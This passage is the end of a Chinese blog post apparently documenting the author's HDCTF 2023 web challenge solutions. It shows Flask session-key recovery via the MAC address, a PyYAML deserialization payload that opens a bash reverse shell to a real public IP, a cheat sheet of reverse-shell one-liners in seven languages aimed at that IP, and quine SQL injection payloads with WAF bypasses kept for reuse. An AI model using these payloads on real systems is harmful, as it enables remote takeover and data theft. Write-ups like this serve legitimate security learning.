+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/boogipop&#x27;)</span><br><span class="line">def load():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.<span class="keyword">exists</span>(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        with open(LoadedFile) as f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>当<code>session=&quot;Welcome To HDCTF2023&quot;</code>通过get方式去读文件 也就是说还需要session伪造 </p>
+<p>伪造需要key 那么看源码是怎么生成的</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*<span class="number">233</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在 python 中使用 uuid 模块生成 UUID（通用唯一识别码）。可以使用 uuid.getnode() 方法来获取计算机的硬件地址，这个地址将作为 UUID 的一部分。  </p>
+<p><code>/sys/class/net/eth0/address</code>，这个就是网卡的位置，读取他进行伪造  </p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682516256550-09f531fb-105e-458e-b1d5-62edbda38d4b.png" alt="img"></p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">random.seed(<span class="number">0</span>x0242ac024ed7) <span class="comment">#去掉：加上0x也就是十六进制</span></span><br><span class="line">print(str(random.random()*<span class="number">233</span>))</span><br></pre></td></tr></table></figure>
+
+<p>得到key为<code>33.893457812509084</code></p>
+<p>通过脚本伪造session</p>
+<p>然后<code>yaml.full_load(f)</code>就是漏洞所在点他会将我们上传的恶意文件内容反序列化 并且代码中并没有回显的语句也暗示了这里要通过反弹shell的方式去打（这里参考这篇大佬的文章太细了 <a target="_blank" rel="noopener" href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/%EF%BC%89">https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/）</a></p>
+<p>上传反序列化文件</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:str</span><br><span class="line">    args: []</span><br><span class="line">    <span class="comment"># 通过 state 触发调用</span></span><br><span class="line">    state: !!python/tuple</span><br><span class="line">      - <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/124.221.177.174/7777 &lt;&amp;1\&quot;&#x27;)&quot;</span><span class="comment">#这里就是代码执行 通过bash直接反弹shell </span></span><br><span class="line">      <span class="comment"># 下面构造 exp</span></span><br><span class="line">      - !!python/object/new:staticmethod</span><br><span class="line">        args: []</span><br><span class="line">        state: </span><br><span class="line">          update: !!python/name:eval</span><br><span class="line">          items: !!python/name:<span class="keyword">list</span>  <span class="comment"># 不设置这个也可以，会报错但也已经执行成功</span></span><br></pre></td></tr></table></figure>
+
+<p>至于为什么上面大佬的文章讲的很仔细 我就不献丑了 自己太菜了</p>
+<p>简单理解就是python将命令执行的代码塞入了对象中然后yaml序列化得到这个 然后再利用反序列化去命令执行 看起来比较奇怪是因为这种格式是属于yaml形式的序列化对象 所以看起来比较的陌生 还有就是这里的命令执行是用反弹shell 是因为通过看源码发现没有回显的代码 所以只能通过反弹shell去变相得到回显</p>
+<p>然后将文件命名为2.txt 这里不能用<code>.yaml</code>后缀被屏蔽了</p>
+<p>既然是txt后缀为什么代码会被执行呢</p>
+<p>这里借用大佬的理解：</p>
+<p>猜测可能是：这里full_load调用了load函数，而load函数输入的是一个steam,也就是流，二进<br>制文件，所以不管是什么后缀都无关紧要了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682518211036-422e9054-fb3e-4dd9-83ca-b93c288dc87a.png" alt="img"></p>
+<p>上传上去</p>
+<p>然后去<code>/boogipop</code>路由下去读取，然后反弹shell</p>
+<p>这里文件路径是<code>uplaods/2.txt</code></p>
+<p>大佬文章也提到了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517504048-653cd836-870e-46e6-93e7-ab8e3953106f.png" alt="img"></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517014776-8237fe1d-8919-406f-9912-cfc0abb2a08b.png" alt="img"></p>
+<p>不要在意这里为什么bp报错 nc能连通就行</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517082099-b27ae5c2-2d34-4496-8e96-9155ecfc2a77.png" alt="img"></p>
+<p>反弹shell成功</p>
+<p>再来说说反弹shell</p>
+<p>这里就说说我的理解，不会去将所有概念一字不漏的打出来，我觉得没必要，理解是最棒的，想看概念随时都可以百度，但是唯独理解是检测自己是否对于一个知识点真的理解了</p>
+<p>我们一般主动攻击去连接某个电脑，叫做正向连接，一般知道这个电脑一些信息ip之类的，知道它何时在做什么</p>
+<p>但是如果我们不知道这台电脑信息ip什么的，或者此时此刻的状态，就叫薛定谔状态吧（bushi，就没法去连接去攻击 那么应该怎么办呢？</p>
+<p>这里就用到了反弹shell 何为反弹？</p>
+<p>既然我们不知道对方的状态 但是我们知道我们的状态信息 我们可以提供我们自己的一些信息去让对方找到我们然后连接不就行了？</p>
+<p>这里可以这么形象的比喻：</p>
+<p>简单的说，就是我送了小明一份礼物，小明收到了，看见礼物里面写着xxx大街xxx户xxx号领取(木马)，小明去了敲门(打开木马，反弹shell)，我开门把他拉进来(netcat)，这样我就有了他的支配权，他的操作就被我控制了。</p>
+<p>来自一个b站网友 我觉得很形象能理解反弹shell的概念</p>
+<p>既然是对方找到我们，就需要用公网ip，我们物理机的ip都是一个局域网分配的，真实ip都掌握在运营商手里</p>
+<p>这里就需要用到vps或者在大厂买云服务即可，当然也不影响我白嫖室友的云服务器:)</p>
+<p>以上只是我浅薄的理解，可以参考这篇文章深入理解：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9488">https://xz.aliyun.com/t/9488</a></p>
+<p>然后我简单总结了一下一些常用的反弹shell的exp：</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.nc</span><br><span class="line">netcat <span class="number">124.221</span>.<span class="number">177.174</span> <span class="number">7777</span> -e /bin/bash</span><br><span class="line"><span class="number">2</span>.bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">124.221</span>.<span class="number">177.174</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="number">3</span>.Telnet:</span><br><span class="line">mknod a p; telnet <span class="number">124.221</span>.<span class="number">177.174</span> <span class="number">7777</span> <span class="number">0</span>&lt;a | /bin/bash <span class="number">1</span>&gt;a</span><br><span class="line"><span class="number">4</span>.python:</span><br><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;124.221.177.174&quot;</span>,<span class="number">7777</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);&#x27;</span><br><span class="line"><span class="number">5</span>.php</span><br><span class="line">php -r &#x27;$sock=fsockopen(<span class="string">&quot;124.221.177.174&quot;</span>,<span class="number">7777</span>);exec(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line"><span class="number">6</span>.perl:</span><br><span class="line">perl -e &#x27;use Socket;$i=<span class="string">&quot;124.221.177.174&quot;</span>;$p=<span class="number">7777</span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);open(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);open(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);exec(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span><br><span class="line"><span class="number">7</span>.sh</span><br><span class="line">nc <span class="number">124.221</span>.<span class="number">177.174</span> <span class="number">7777</span> -e /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>回到题目，发现没有关于flag的文件，所以还是通过读取环境变量来读flag，结束。</p>
+<h2 id="LoginMaster"><a href="#LoginMaster" class="headerlink" title="LoginMaster"></a>LoginMaster</h2><p>这道题 我的评价是寄，刷题没刷到过这样的注入——quine注入，还有时间盲注也还没有开始学借助此次机会学习学习</p>
+<p>首先日常先看<code>/robots.txt</code>发现了waf</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682570503152-ae120381-50eb-43c4-9634-a47cff72b0f9.png" alt="img"></p>
+<p>看到waf后我就陷入了沉思，我能想到的payload所包含的几乎都河蟹了个遍，这还怎么玩，就放弃了</p>
+<p>看了wp要用时间盲注和quine组合拳去打</p>
+<p>其实看了waf 这段代码也大概能感觉到是quine注入 </p>
+<p>这里就是需要我们输入的密码与查询到的密码相等 </p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class="line">        die($FLAG);</span><br></pre></td></tr></table></figure>
+
+<p>说简单一点，quine注入就是输入与输出完全相同 自产生程序也就是说就是输入的sql语句与要输出的一致  </p>
+<p>用到replace()函数</p>
+<p>如果输入 <code>replace(&quot;.&quot;,char(46),&quot;.&quot;) </code> </p>
+<p>则会输出 <code>.</code></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682596804773-43900a23-f1bb-4f21-bd92-1258a4af3700.png" alt="img"></p>
+<p>如果输入  <code>replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;) </code> </p>
+<p>则会用第三个参数去替换第一个参数中的所有<code>.</code></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682596879463-3e74e07c-7f75-48f1-92e4-69d21e9d6a21.png" alt="img"></p>
+<p>但是此时就会发现一个问题 我们输入与输出并不是完全相同的</p>
+<p>我们输入的单引号在输出语句里都是双引号</p>
+<p>因此 需要在repalce里面再嵌套一个replace来让双引号转成单引号  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682597458239-a1bc5eba-19bd-4464-afe0-f5582b6f9c02.png" alt="img"></p>
+<p>用上面的式子替换所有的<code>.</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>就会发现输入与输出完全相等</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682597557792-2a8afbc9-a8a2-4de8-a340-a3415d2e2d08.png" alt="img"></p>
+<p> 回到题目 因为屏蔽了空格用<code>()</code>嵌套或者<code>/**/</code>绕过都行</p>
+<p>payload:<code>1&#39;UNION(SELECT(REPLACE(REPLACE(&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;,CHAR(34),CHAR(39)),CHAR(37),&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;)))#</code></p>
+<p>分析：</p>
+<p><code>1&#39;UNION(SELECT(REPLACE(A,CHAR(37),B)))</code>  用B替换%,%这个符号应该是任意的后续替换时变成相应的char就行</p>
+<p><code>A:REPLACE(&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;,CHAR(34),CHAR(39))</code>  双引号换为单引号-&gt;替换%-&gt;双引号换为单引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B:&#x27;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>双引号换位单引号-&gt;替换%</p>
+<p>提供三种payload吧，以后如果再遇到这样的题目也能拿来直接用</p>
+<ol>
+<li><code>1&#39;/**/union/**/select/**/replace(replace(&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#</code></li>
+<li><code>1&#39;union/**/select/**/replace(replace(&#39;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#</code></li>
+<li><code>1&#39;UNION(SELECT(REPLACE(REPLACE(&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;,CHAR(34),CHAR(39)),CHAR(37),&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;)))#</code></li>
+</ol>
+<p>第一个payload与第二个payload之间的差距：为第一个与union之间有空格，第二个无，本质上两个payload无区别</p>
+<p>注意sql中为char()而不是chr() 网上payload需要转换</p>
+<p>搞定：</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682598202760-5e0a4fac-7660-4486-bee9-9ef75f6b6530.png" alt="img"></p>
+<p>至于时间盲注这个坑，以后遇到经典题型借助题目来总结吧，这里插个眼先:)</p>
+<p>还有两道java题目就不复现了，java还是我没有解锁的领域，复现起来也很吃力，之后系统开始学java之后再来复现填坑吧。</p>
+<h1 id="小尾巴"><a href="#小尾巴" class="headerlink" title="小尾巴"></a>小尾巴</h1><p>这次打完省赛（校赛bushi）虽然很水，但是成功爬进了学校的实验室，也算是一段时间的努力总算有了成果吧，进了实验室才是刚刚开始，自身还是有很多不足，需要继续努力，继续奋斗，干巴得！</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Z1d10t
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://example.com/post/dd40690e.html" title="HDCTF 2023(省内赛道)">http://example.com/post/dd40690e.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Smarty%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag"># Smarty模板注入</a>
+              <a href="/tags/js/" rel="tag"># js</a>
+              <a href="/tags/Yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># Yaml反序列化</a>
+              <a href="/tags/shell%E5%8F%8D%E5%BC%B9/" rel="tag"># shell反弹</a>
+              <a href="/tags/quine%E6%B3%A8%E5%85%A5/" rel="tag"># quine注入</a>
+              <a href="/tags/python3%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/" rel="tag"># python3解析特性</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/post/186d5605.html" rel="prev" title="CTF-SHOW 2023愚人杯 WEB部分WP">
+                  <i class="fa fa-chevron-left"></i> CTF-SHOW 2023愚人杯 WEB部分WP
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/post/78a48903.html" rel="next" title="buuctf 39-[BSidesCF 2020]Had a bad day">
+                  buuctf 39-[BSidesCF 2020]Had a bad day <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2023.2 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z1d10t</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+    </div>
+  </footer>
+
+  
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
